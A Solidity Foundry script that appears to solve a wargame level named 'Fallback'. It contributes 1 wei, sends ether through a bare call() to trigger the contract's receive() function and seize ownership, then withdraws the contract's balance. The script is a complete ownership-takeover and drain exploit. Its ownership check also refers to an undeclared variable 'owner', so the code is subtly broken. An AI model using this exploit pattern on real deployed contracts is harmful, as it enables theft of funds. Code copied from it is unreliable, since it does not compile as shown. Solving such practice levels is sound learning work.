// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/level1.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

/// @notice poor fallback implementation
contract Level1Solution is Script {

    Fallback public level = Fallback(payable(0xc15362c4c42982D67cb70b90160B911614F1717f));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        level.contribute{value: 1 wei}();
        // Send ether by call() will trigger the receive() function
        address(level).call{value: 1 wei}("");
        
        if(owner == vm.envAddress("MY_ADDRESS")){
            level.withdraw();
            console.log("Withdrawal completed.");
            console.log("New owner: ", level.owner());
        }
        
        vm.stopBroadcast();
    }
}